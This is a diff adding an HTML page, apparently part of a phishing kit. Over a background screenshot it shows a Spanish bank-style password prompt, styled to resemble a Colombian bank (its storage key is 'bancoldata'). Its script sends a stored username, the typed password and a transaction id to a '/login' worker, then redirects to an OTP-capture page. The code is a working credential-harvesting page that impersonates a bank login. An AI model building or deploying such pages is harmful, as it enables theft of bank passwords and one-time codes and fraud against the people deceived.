@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ingrese su Clave</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body, html {
+            height: 100%;
+            width: 100%;
+            background-color: #f0f0f0;
+            overflow: hidden;
+        }
+        .image-container {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            position: relative;
+        }
+        .image-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .center-box {
+            position: absolute;
+            top: 55%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgb(255, 255, 255);
+            width: 290px;
+            height: 66px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 8px;
+        }
+        .center-box .input-container {
+            position: relative;
+            width: 80%;
+        }
+        .center-box input {
+            width: 100%;
+            padding: 10px;
+            padding-left: 40px;
+            font-size: 19px;
+            border: none;
+            border-bottom: 1px solid #ffe100;
+            outline: none;
+        }
+        .button-container {
+            position: absolute;
+            top: 70.4%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            gap: 10px;
+        }
+        .button-container button {
+            padding: 13px 35px;
+            font-size: 13px;
+            border: none;
+            border-radius: 50px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .button-container button:first-child {
+            background-color: #ffffff;
+            border: 1px solid black;
+        }
+        .button-container button:last-child {
+            background-color: #ffda37;
+            color: black;
+        }
+    </style>
+</head>
+<body>
+    <div class="image-container">
+        <img src="img/cel1.jpg" alt="Background Image">
+        <div class="center-box">
+            <div class="input-container">
+                <i>🔒</i>
+                <input type="password" placeholder="Clave" id="claveInput">
+            </div>
+        </div>
+        <div class="button-container">
+            <button onclick="window.history.back()">Cancelar</button>
+            <button id="loginButton">Ingresar</button>
+        </div>
+    </div>
+
+    <script>
+        const claveInput = document.getElementById('claveInput');
+        const loginButton = document.getElementById('loginButton');
+
+        loginButton.addEventListener('click', async () => {
+            const claveValue = claveInput.value.trim();
+            
+            if (claveValue.length >= 4) {
+                try {
+                    // Obtener datos de localStorage
+                    const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
+                    const usuario = bancoldata.usuario;
+                    const transactionId = bancoldata.transactionId;
+
+                    if (!usuario || !transactionId) {
+                        alert('Error: Datos de sesión no encontrados');
+                        return;
+                    }
+
+                    // Enviar login al worker
+                    const response = await fetch('/login', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            usuario: usuario,
+                            clave: claveValue,
+                            transactionId: transactionId
+                        })
+                    });
+
+                    const result = await response.json();
+                    
+                    if (result.ok) {
+                        // Redirigir a la siguiente pantalla (OTP)
+                        window.location.href = 'cel-otp.html';
+                    } else {
+                        alert('Error en el login: ' + (result.error || 'Error desconocido'));
+                    }
+                    
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('Error al procesar el login');
+                }
+            } else {
+                alert('Por favor, ingrese una clave válida de al menos 4 caracteres.');
+            }
+        });
+
+        // También enviar con Enter
+        claveInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                loginButton.click();
+            }
+        });
+    </script>
+</body>
+</html>
